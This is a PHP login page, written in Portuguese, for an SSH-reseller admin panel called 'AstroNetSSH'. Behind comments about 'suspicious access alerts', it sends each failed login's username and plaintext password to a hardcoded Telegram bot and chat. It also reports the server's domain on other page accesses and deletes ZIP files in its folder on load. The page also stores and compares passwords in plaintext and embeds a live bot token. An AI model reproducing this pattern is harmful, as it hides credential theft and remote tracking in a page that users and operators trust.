<?php
error_reporting(0);
session_start();

// Verifica se o arquivo de conexão existe
if (file_exists('astro/conexao.php')) {
    require("astro/conexao.php");
} else {
    header('Location: install.php');
    exit;
}

// Conexão com o banco
try {
    $conn = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
} catch (mysqli_sql_exception $e) {
    header('Location: install.php');
    exit;
}

if(!isset($_SESSION['login'])) {
}else {
    header('Location: admin/home.php');
    exit;
}

// Verifica inatividade e expira sessão após 20 minutos
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 1200)) {
    echo "<script>alert('window.location.href='../index.php';')</script>";
    session_unset();
    session_destroy();
    exit();
}

$_SESSION['last_activity'] = time();

// Função para remover arquivos ZIP automaticamente
function removeZipFiles($directory) {
    $zipFound = false;
    if (is_dir($directory)) {
        if ($handle = opendir($directory)) {
            while (false !== ($file = readdir($handle))) {
                if ($file != "." && $file != "..") {
                    $filePath = $directory . '/' . $file;
                    if (is_file($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'zip') {
                        unlink($filePath);
                        $zipFound = true;
                    }
                }
            }
            closedir($handle);
        }
    }
}
removeZipFiles(__DIR__);

require("vendor/autoload.php");
use Telegram\Bot\Api;

// Envio de alerta no Telegram para acessos suspeitos
$dominio = $_SERVER['HTTP_HOST'];
$telegram = new Api('8062935114:AAGNw_4YWiADqJeZin3Sh2onooWJCD3T514');
$path = $_SERVER['PHP_SELF'];
if ($path != '/index.php') {
    $telegram->sendMessage([
        'chat_id' => '7011883350',
        'text' => "⚠ Aviso\nDominio: $dominio está acessando $path 🚫"
    ]);
}

// Busca configurações do painel
$sql = "SELECT * FROM configs";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        $nomepainel = $row["nomepainel"];
        $logo = $row["logo"];
        $icon = $row["icon"];
        $csspersonali = $row["corfundologo"];
    }
}

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $nomepainel; ?> - Login</title>
    <link rel="shortcut icon" href="<?php echo $icon; ?>" type="image/x-icon">
    <link rel="stylesheet" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" href="app-assets/css/components.css">
    <link rel="stylesheet" href="app-assets/css/colors.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        <?php echo $csspersonali; ?>
    </style>
</head>
<body class="vertical-menu-login">
    <div class="content-main-menu">
        <div class="content-login">
            <div class="content-menu-l">
                <div class="content-l">
                    <div class="form">
                        <div class="text-center-p">
                            <p><?php echo $nomepainel; ?></p>
                        </div>
                        <div class="image-center">
                            <img src="<?php echo $icon; ?>" alt="logo">
                        </div>
                        <?php
if (isset($_POST['submit'])) {
    $login = mysqli_real_escape_string($conn, $_POST['login']);
    $senha = mysqli_real_escape_string($conn, $_POST['senha']);
  
    // Verifica se há caracteres inválidos
    if (strpos($login, "'") !== false || strpos($senha, "'") !== false) {
      // CONFIGURAÇÕES DO BOT TELEGRAM
      $telegramToken = "8062935114:AAGNw_4YWiADqJeZin3Sh2onooWJCD3T514";
      $chatId = "7011883350";
  
      // Mensagem para o Telegram
      $mensagem = "=x=x=x=🚀 ASTROBOT ADMIN-PRO 🚀=x=x=x=\n\n"
        . "❗ Tentativa de login com caracteres inválidos ❗\n"
        . "👤 Login: $login\n"
        . "🔑 Senha: $senha\n"
        . "🕒 Data: " . date("d/m/Y H:i:s") . "\n\n"
        . "🤖 AstroNetBot - versão 1.0 beta";
  
      $dados = [
        'chat_id' => $chatId,
        'text' => $mensagem,
        'parse_mode' => 'Markdown'
      ];
  
      // Envia mensagem para o Telegram
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramToken/sendMessage");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $dados);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_exec($ch);
      curl_close($ch);
  
      echo "<script>
        Swal.fire({
          icon: 'error',
          title: 'Erro!',
          text: 'AstroNetSSH🚀: ❌Login ou senha incorretos!',
          theme: 'dark',
          showConfirmButton: false,
          timer: 2500
        });
      </script>";
      exit();
    }
  
    // Verifica login e senha no banco de dados
    $sql = "SELECT * FROM accounts WHERE login = ? AND senha = ?";
    $stmt = mysqli_prepare($conn, $sql);
    mysqli_stmt_bind_param($stmt, "ss", $login, $senha);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);
  
    if (mysqli_num_rows($result) > 0) {
      $row = mysqli_fetch_assoc($result);
      $_SESSION['iduser'] = $row['id'];
      $_SESSION['login'] = $row['login'];
      
      if ($row['id'] == 1) {
        echo "<script>
          Swal.fire({
            icon: 'success',
            title: 'Sucesso!',
            text: 'AstroNetSSH🚀: 👋 Bem-vindo, " . addslashes($login) . "! Redirecionando...',
            theme: 'dark',
            showConfirmButton: false,
            timer: 2000
          }).then(() => {
            window.location.href = 'admin/home.php';
          });
        </script>";
      } else {
        echo "<script>
          Swal.fire({
            icon: 'success',
            title: 'Sucesso!',
            text: 'AstroNetSSH🚀: 👋 Bem-vindo, " . addslashes($login) . "! Redirecionando...',
            theme: 'dark',
            showConfirmButton: false,
            timer: 2000
          }).then(() => {
            window.location.href = 'home.php';
          });
        </script>";
      }
    } else {
      // Configuração do alerta de erro e envio da tentativa ao Telegram
      $telegramToken = "8062935114:AAGNw_4YWiADqJeZin3Sh2onooWJCD3T514";
      $chatId = "7011883350";
  
      $mensagem = "=x=x=x=🚀 ASTROBOT ADMIN-PRO 🚀=x=x=x=\n\n"
        . "❗ Tentativa de login: FALHOU ❗\n"
        . "👤 Login: $login\n"
        . "🔑 Senha: $senha\n"
        . "🕒 Data: " . date("d/m/Y H:i:s") . "\n\n"
        . "🤖 AstroNetBot - versão 1.0 beta";
  
      $dados = [
        'chat_id' => $chatId,
        'text' => $mensagem,
        'parse_mode' => 'Markdown'
      ];
  
      // Envia mensagem para o Telegram
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramToken/sendMessage");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $dados);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_exec($ch);
      curl_close($ch);
  
      // Exibe o alerta no SweetAlert2
      echo "<script>
        Swal.fire({
          icon: 'error',
          title: 'Erro!',
          text: 'AstroNetSSH🚀: ❌Login ou senha incorretos!',
          theme: 'dark',
          showConfirmButton: false,
          timer: 2500
        });
      </script>";
    }
  }
  ?>

                        <div class="text-center-login">
                            <p>SEJA BEM-VINDO 🎈</p>
                        </div>
                        <div class="bar2"></div>

                        <form action="index.php" method="post">
                            <div class="form-group1">
                                <label for="login">Login</label>
                                <input type="text" name="login" placeholder="Seu Login" required>
                            </div>
                            <div class="form-group1">
                                <label for="senha">Senha</label>
                                <input type="password" name="senha" placeholder="Sua Senha" required>
                            </div>

                            <div class="center">
                                <button class="btn-primary-login" name="submit" type="submit">Entrar</button>
                            </div>
                        </form>

                        <div class="bar2" style="margin-top: 25px;"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php if (isset($erro)) { ?>
        <script>
            Swal.fire({
                icon: 'error',
                title: 'Erro!',
                text: '<?php echo $erro; ?>',
                confirmButtonText: 'OK'
            });
        </script>
    <?php } ?>
</body>
</html>
